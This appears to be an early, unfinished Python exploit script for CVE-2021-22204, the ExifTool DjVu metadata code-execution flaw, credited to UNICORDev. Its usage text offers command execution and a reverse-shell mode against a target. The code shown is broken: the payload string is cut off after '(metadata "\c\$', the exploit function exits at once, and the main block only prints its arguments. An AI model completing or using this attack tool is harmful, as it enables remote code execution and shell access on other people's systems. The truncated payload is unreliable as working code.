#!/usr/bin/env python3
# Made by @UNICORDev (by @NicPWNs and @Dev-Yeoj)
# https://github.com/UNICORDev/exploit-CVE-2021-22204
# CVE-2021-22204
# Improper neutralization of user data in the DjVu file format in ExifTool versions 7.44 and up allows arbitrary code execution when parsing the malicious image

r"""UNICORD Exploit for CVE-2021-22204

        _ __,~~~/_        __  ___  _______________  ___  ___
    ,~~`( )_( )-\|       / / / / |/ /  _/ ___/ __ \/ _ \/ _ \
        |/|  `--.       / /_/ /    // // /__/ /_/ / , _/ // /
        ! !  !          \____/_/|_/___/\___/\____/_/|_/____/

Usage:
  exploit-CVE-2021-22204.py -c <command>
  exploit-CVE-2021-22204.py -s <local-IP> <local-port>
  exploit-CVE-2021-22204.py (-h | --help)

Options:
  -h --help     Show this screen.
  -c --command  Command to execute on target.
  -s --shell    Reverse shell mode. Provide local IP and port.
"""

# Imports
import base64
import re
import subprocess
import sys
from docopt import docopt

def exploit(command):
    UNICORD_ASCII()
    print("Running Command: " + command)
    payload = "(metadata \"\c\$"
    print(payload)
    exit()

# Print UNICORD ASCII Art
def UNICORD_ASCII():
    print(r"""
        _ __,~~~/_        __  ___  _______________  ___  ___
    ,~~`( )_( )-\|       / / / / |/ /  _/ ___/ __ \/ _ \/ _ \
        |/|  `--.       / /_/ /    // // /__/ /_/ / , _/ // /
        ! !  !          \____/_/|_/___/\___/\____/_/|_/____/
    """)

if __name__ == "__main__":

    arguments = docopt(__doc__)
    print(arguments)